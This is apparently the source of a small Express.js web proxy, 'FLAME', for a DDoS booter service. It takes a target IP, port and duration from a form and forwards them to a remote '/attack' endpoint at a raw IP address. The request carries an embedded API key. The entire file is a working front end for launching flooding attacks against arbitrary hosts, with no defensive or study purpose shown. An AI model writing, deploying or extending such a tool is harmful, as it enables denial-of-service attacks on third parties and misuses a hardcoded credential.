const express = require('express');
const axios = require('axios');
const app = express();
const PORT = 3000;

// ⚠️ API KEY HIDDEN HERE — NOT IN HTML
const API_KEY = 'gRzSotjS6tabJ9C6tvUU0fgX5nGvrnYW';
const BASE_URL = 'http://13.232.68.73:3938/attack';

app.use(express.json());
app.use(express.static('public')); // Serve index.html from /public folder

app.post('/attack', async (req, res) => {
    const { ip, port, time } = req.body;

    if (!ip || !port || !time) {
        return res.json({ success: false, message: 'Missing parameters' });
    }

    try {
        const response = await axios.get(BASE_URL, {
            params: {
                ip: ip,
                port: port,
                time: time,
                key: API_KEY
            },
            timeout: 10000
        });

        // Check if attack was accepted (adjust based on actual API response)
        if (response.status === 200) {
            return res.json({ 
                success: true, 
                message: 'Attack triggered',
                detail: response.data 
            });
        } else {
            return res.json({ 
                success: false, 
                message: `API returned ${response.status}` 
            });
        }
    } catch (error) {
        return res.json({ 
            success: false, 
            message: error.response?.data || error.message 
        });
    }
});

app.listen(PORT, () => {
    console.log(`🔥 FLAME proxy running on http://localhost:${PORT}`);
    console.log(`🔑 Key loaded: ${API_KEY.substring(0,8)}... (hidden from client)`);
});
